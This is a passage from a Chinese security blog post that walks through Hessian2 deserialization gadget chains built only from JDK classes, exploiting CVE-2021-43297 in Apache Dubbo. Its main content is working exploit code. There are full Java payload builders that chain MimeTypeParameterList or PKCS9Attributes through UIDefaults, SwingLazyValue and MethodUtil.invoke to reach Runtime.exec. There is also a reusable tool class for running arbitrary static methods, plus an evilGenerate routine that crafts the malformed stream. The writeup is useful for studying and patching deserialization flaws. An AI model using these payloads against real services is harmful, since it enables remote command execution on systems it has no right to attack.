class_">ByteArrayInputStream</span>(serializedData);</span><br><span class="line">        <span class="type">HessianInput</span> <span class="variable">hessianInput</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HessianInput</span>(byteArrayInputStream);</span><br><span class="line">        hessianInput.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h1 id="🚩-OnlyJDK-利用-重要-🚩"><a href="#🚩-OnlyJDK-利用-重要-🚩" class="headerlink" title="🚩 OnlyJDK 利用(重要)🚩"></a>🚩 OnlyJDK 利用(重要)🚩</h1><h2 id="–利用任意类toString–"><a href="#–利用任意类toString–" class="headerlink" title="–利用任意类toString–"></a>–利用任意类toString–</h2><h3 id="前情提要"><a href="#前情提要" class="headerlink" title="前情提要"></a>前情提要</h3><p>以上的payload实质上都是将其他反序列化的利用链改造了而已，这里讲的内容不需要任何其他依赖即可利用。</p>
<p>通过tabby，可以找到两个可以直接利用toString的链子，具体为什么要这样找，看我的2022 0ctf-hessian2 onlyjdk</p>
<p>[0ctf-hessian2 onlyjdk ownWriteUp](R:\Competition questions\0ctf2022\ownsolve\0ctf_hessian2_solved.md)</p>
<div class="highlight-container" data-rel="Ceylon"><figure class="iseeu highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">match path=(m<span class="number">1</span>:Method&#123;NAME:<span class="string">&#x27;toString&#x27;</span>&#125;)-[:CALL*..<span class="number">3</span>]-&gt;(sink:Method&#123;NAME:<span class="string">&quot;get&quot;</span>&#125;) WHERE sink.CLASSNAME =~ <span class="string">&quot;.*Hashtable&quot;</span> <span class="keyword">return</span> path</span><br></pre></td></tr></table></figure></div>

<p>分别是</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javax.activation.MimeTypeParameterList#toString</span><br><span class="line">sun.security.pkcs.PKCS9Attributes#toString</span><br></pre></td></tr></table></figure></div>



<p>由于这里toString 本质上利用的是 CVE-2021-43297 ， 因此需要注意一下dubbo版本范围。hessian的情况下，注意看看expect方法是否被修改即可。</p>
<table>
<thead>
<tr>
<th>组件</th>
<th>影响版本</th>
<th>安全版本</th>
</tr>
</thead>
<tbody><tr>
<td>Apache Dubbo 2.6.x</td>
<td>&lt; 2.6.12</td>
<td>2.6.12</td>
</tr>
<tr>
<td>Apache Dubbo 2.7.x</td>
<td>&lt; 2.7.15</td>
<td>2.7.15</td>
</tr>
<tr>
<td>Apache Dubbo 3.0.x</td>
<td>&lt; 3.0.5</td>
<td>3.0.5</td>
</tr>
</tbody></table>
<p><strong>然后就是几个关键类及其方法</strong></p>
<h2 id="①MethodUtils-invoke"><a href="#①MethodUtils-invoke" class="headerlink" title="①MethodUtils  invoke"></a>①MethodUtils  invoke</h2><h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attributes;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MethodUtils_invoke</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//Payload1();</span></span><br><span class="line">        Payload2();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Payload1</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, slz);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">ml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        Reflections.setFieldValue(ml,<span class="string">&quot;parameters&quot;</span>,uiDefaults);</span><br><span class="line">        Hessian2_expect.evilGenerate(ml);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Payload2</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">invokeMethod</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>)</span><br><span class="line">                .getDeclaredMethod(<span class="string">&quot;invoke&quot;</span>, Method.class, Object.class, Object[].class);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.EMAIL_ADDRESS_OID,slz);</span><br><span class="line">        <span class="type">PKCS9Attributes</span> <span class="variable">pkcs9Attributes</span> <span class="operator">=</span> Reflections.createWithoutConstructor(PKCS9Attributes.class);</span><br><span class="line">        Reflections.setFieldValue(pkcs9Attributes,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        Hessian2_expect.evilGenerate(pkcs9Attributes);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>先讲链子，该利用链是从XString 的 CVE-2021-21346 这个链子转化而来（当时学的比较简略，这里好好跟一跟。</p>
<p>首先Hessian2的出发点是 CVE-2021-43297 。通过错误字节报错触发toString。（详情见Dubbo的笔记内容）</p>
<p>然后我们可以先选用上面发现的其中一个类：MimeTypeParameterList</p>
<p><strong>MimeTypeParameterList#toString</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230218175403683.png"
                      alt="image-20230218175403683"
                ></p>
<p>会去触发 this.parameters.get ，这个 parameters 便是我们设置的 UIDefaults（继承HashTable，我们也是通过这个特征能够更好的使用tabby进行挖掘利用链）。</p>
<p><strong>UIDefaults#get</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getFromHashtable( key );</span><br><span class="line">    <span class="keyword">return</span> (value != <span class="literal">null</span>) ? value : getFromResourceBundle(key, <span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>跟进getFromHashtable</p>
<p><strong>UIDefaults#getFromHashtable</strong></p>
<p>这个方法挺长，大概称述一下进行的操作，首先通过UIDefaults获取key对应的value，判断value，如果不满足以下其一，则退出</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value != PENDING</span><br><span class="line">value <span class="keyword">instanceof</span> ActiveValue</span><br><span class="line">value <span class="keyword">instanceof</span> LazyValue</span><br></pre></td></tr></table></figure></div>

<p>我们设置的value是 SwingLazyValue ，显然满足第二个，继续往下走。</p>
<p>然后进行了一个put操作，后续就会触发我们的关键代码 value.createValue，而value我们设置的为 SwingLazyValue 对象</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20230218180353389.png"
                      alt="image-20230218180353389"
                ></p>
<p><strong>SwingLazyValue#createValue</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">createValue</span><span class="params">(UIDefaults var1)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ReflectUtil.checkPackageAccess(<span class="built_in">this</span>.className);</span><br><span class="line">            <span class="type">Class</span> <span class="variable">var2</span> <span class="operator">=</span> Class.forName(<span class="built_in">this</span>.className, <span class="literal">true</span>, (ClassLoader)<span class="literal">null</span>);</span><br><span class="line">            Class[] var3;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.methodName != <span class="literal">null</span>) &#123;</span><br><span class="line">                var3 = <span class="built_in">this</span>.getClassArray(<span class="built_in">this</span>.args);</span><br><span class="line">                <span class="type">Method</span> <span class="variable">var6</span> <span class="operator">=</span> var2.getMethod(<span class="built_in">this</span>.methodName, var3);</span><br><span class="line">                <span class="built_in">this</span>.makeAccessible(var6);</span><br><span class="line">                <span class="keyword">return</span> var6.invoke(var2, <span class="built_in">this</span>.args);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                var3 = <span class="built_in">this</span>.getClassArray(<span class="built_in">this</span>.args);</span><br><span class="line">                <span class="type">Constructor</span> <span class="variable">var4</span> <span class="operator">=</span> var2.getConstructor(var3);</span><br><span class="line">                <span class="built_in">this</span>.makeAccessible(var4);</span><br><span class="line">                <span class="keyword">return</span> var4.newInstance(<span class="built_in">this</span>.args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>处理逻辑：</p>
<p>首先通过 checkPackageAccess 判断类名是否正确。然后通过反射获取类赋给var2。</p>
<p>之后利用 getClassArray 将 this.args 参数（是一个Object数组）里面的所有类对象的类拿到。</p>
<p>再之后，对var2调用反射获取对应方法，方法名为this.methodName，参数类型为var3。</p>
<p>然后 makeAccessible 的操作等价于 setAccessible</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">makeAccessible</span><span class="params">(<span class="keyword">final</span> AccessibleObject var1)</span> &#123;</span><br><span class="line">        AccessController.doPrivileged(<span class="keyword">new</span> <span class="title class_">PrivilegedAction</span>&lt;Void&gt;() &#123;</span><br><span class="line">            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">                var1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>之后返回调用内容 var6.invoke(var2, this.args);</p>
<p>这里就相当于实现了一次反射，而恰好这里面的内容我们均可控。我们看看 SwingLazyValue 的其中一个有意思的构造方法</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">SwingLazyValue</span><span class="params">(String var1, String var2, Object[] var3)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.className = var1;</span><br><span class="line">        <span class="built_in">this</span>.methodName = var2;</span><br><span class="line">        <span class="keyword">if</span> (var3 != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.args = (Object[])var3.clone();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>配合上面的代码，实际上触发的内容等价于下面的内容</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var1.getClass.getMethod(var2, getClassArray(var3)).invoke(Class.forName(<span class="built_in">this</span>.className, <span class="literal">true</span>, (ClassLoader)<span class="literal">null</span>), <span class="built_in">this</span>.args);</span><br></pre></td></tr></table></figure></div>

<p>也就是通过这个构造方法，第一个参数是类名，第二个是要调用的方法名，第三个是方法参数。这里就有个地方需要被我们关注到了，就是我们在使用 Invoke 方法的时候，我们的第一个参数是个Class类型的值，而一般来说反射需要的是对应类的实例对象才行，所以这里的方法调用只能去触发 static静态方法。<font color="red"><strong>所以直接去触发exec方法是不可行的</strong></font>，因此多加了一步，去调用 MethodUtils  的 invoke方法。</p>
<p>（因为需要第三个参数满足调用方法的参数类型，因此有了第一次的构造样子）构造如下</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;</span><br><span class="line">                &#125;);</span><br></pre></td></tr></table></figure></div>



<p><strong>继续看我们的这里重点讲的 MethodUtils  类的invoke方法，这里的invoke实际上被调用了两次</strong></p>
<p>由于我们 SwingLazyValue  构造的是：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SwingLazyValue</span> <span class="variable">slz</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">SwingLazyValue</span>(<span class="string">&quot;sun.reflect.misc.MethodUtil&quot;</span>, <span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;</span><br><span class="line">                        invokeMethod,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>(),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;</span><br><span class="line">                &#125;);</span><br></pre></td></tr></table></figure></div>

<p>它会去反射触发invoke方法，这是第一次。</p>
<p>此时的内容等价于：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MethodUtil.invoke(invokeMethod,<span class="keyword">new</span> <span class="title class_">Object</span>(),<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure></div>

<p>我们看看invoke具体内容</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> bounce.invoke((Object)<span class="literal">null</span>, var0, var1, var2);</span><br><span class="line">   &#125; <span class="keyword">catch</span>()&#123;</span><br><span class="line">   	....</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p>继续看 bounce.invoke ，而 bounce 为Method的类，这里就相当于触发了 Method 的 invoke 方法</p>
<p>可以自己继续往下跟，最终又会回到该invoke方法（我是看了的，但是苦于表达拙劣，写不清楚。。），我就简单说说结果</p>
<p><strong>这个 MethodUtils  类的 invoke 方法相当于是</strong></p>
<p>第一个参数为Method类型的需要使用的方法名，第二个为调用对象，第三为Object数组，数组里面的内容会根据类型自动查找合适的方法，并将其作为作为方法的参数。</p>
<p>因此第一次调用会调用 invokeMethod （为MethodUtil.invoke），对象为Object的实例（由于为静态方法，可以通过Object调用），第三个参数为参数值，因此通过这次之后，触发以下内容</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MethodUtil.invoke(exec, Runtime.getRuntime(), <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br></pre></td></tr></table></figure></div>

<p>exec为我们写好的 Runtime#exec 方法。与上面同理，通过这种调用，可以变为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Runtime.exec(“calc”);</span><br></pre></td></tr></table></figure></div>

<p>最终导致命令执行</p>
<p>如果想获取String[]类型值的exec方法，通过上面的构造，不难想到为</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object[]&#123;String[]&#123;cmd&#125;&#125;</span><br></pre></td></tr></table></figure></div>



<p>这个利用链构造上来说感觉还是比较精妙的，很难想到。</p>
<h3 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h3><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HashMap.equals</span><br><span class="line">	UIDefault.get</span><br><span class="line">    		UIDefaults.getFromHashTable</span><br><span class="line">       			UIDefaults$LazyValue.createValue</span><br><span class="line">       				SwingLazyValue.createValue</span><br><span class="line">            				MethodUtil.invoke</span><br><span class="line">                				MethodUtil.invoke</span><br><span class="line">                    					Runtime.getRuntime.exec</span><br></pre></td></tr></table></figure></div>



<h2 id="🚩部分总结-UIDefaults-SwingLazyValue执行任意静态方法"><a href="#🚩部分总结-UIDefaults-SwingLazyValue执行任意静态方法" class="headerlink" title="🚩部分总结-UIDefaults&amp;SwingLazyValue执行任意静态方法"></a>🚩部分总结-UIDefaults&amp;SwingLazyValue执行任意静态方法</h2><p>(有局限性，后面会提到)</p>
<p><strong>总结为以下工具类</strong></p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> OnlyJDK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Tool.Reflections;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Input;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.Hessian2Output;</span><br><span class="line"><span class="keyword">import</span> com.caucho.hessian.io.SerializerFactory;</span><br><span class="line"><span class="keyword">import</span> sun.security.pkcs.PKCS9Attribute;</span><br><span class="line"><span class="keyword">import</span> sun.swing.SwingLazyValue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.activation.MimeTypeParameterList;</span><br><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2_OnlyJDK_Tool</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AnyStaticMethodExecute1</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        SwingLazyValue value= <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(className, methodName, args);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(PKCS9Attribute.CHALLENGE_PASSWORD_OID,value);</span><br><span class="line">        Object o=Reflections.createWithoutConstructor(Class.forName(<span class="string">&quot;sun.security.pkcs.PKCS9Attributes&quot;</span>));</span><br><span class="line">        Reflections.setFieldValue(o,<span class="string">&quot;attributes&quot;</span>,uiDefaults);</span><br><span class="line">        evilGenerate(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">AnyStaticMethodExecute2</span><span class="params">(String className, String methodName, Object[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        SwingLazyValue value= <span class="keyword">new</span> <span class="title class_">SwingLazyValue</span>(className, methodName, args);</span><br><span class="line">        <span class="type">UIDefaults</span> <span class="variable">uiDefaults</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">UIDefaults</span>();</span><br><span class="line">        uiDefaults.put(<span class="string">&quot;koishi&quot;</span>, value);</span><br><span class="line">        <span class="type">MimeTypeParameterList</span> <span class="variable">ml</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MimeTypeParameterList</span>();</span><br><span class="line">        Reflections.setFieldValue(ml, <span class="string">&quot;parameters&quot;</span>, uiDefaults);</span><br><span class="line">        evilGenerate(ml);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">evilGenerate</span><span class="params">(Object o)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">Hessian2Output</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hessian2Output</span>(byteArrayOutputStream);</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">serializerFactory1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SerializerFactory</span>();</span><br><span class="line">        serializerFactory1.setAllowNonSerializable(<span class="literal">true</span>);</span><br><span class="line">        Reflections.setFieldValue(out, <span class="string">&quot;_serializerFactory&quot;</span>, serializerFactory1);</span><br><span class="line">        out.writeObject(o);</span><br><span class="line">        out.flushBuffer();</span><br><span class="line">        <span class="type">byte</span>[] classBytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">byte</span>[] evilByte = <span class="keyword">new</span> <span class="title class_">byte</span>[classBytes.length + <span class="number">2</span>];</span><br><span class="line">        evilByte[<span class="number">0</span>] = <span class="number">67</span>;</span><br><span class="line">        evilByte[<span class="number">1</span>] = <span class="number">67</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (; i &lt; classBytes.length; i++) &#123;</span><br><span class="line">            evilByte[<span class="number">2</span> + i] = classBytes[i];</span><br><span class="line">        &#125;</span><br><span class="line">        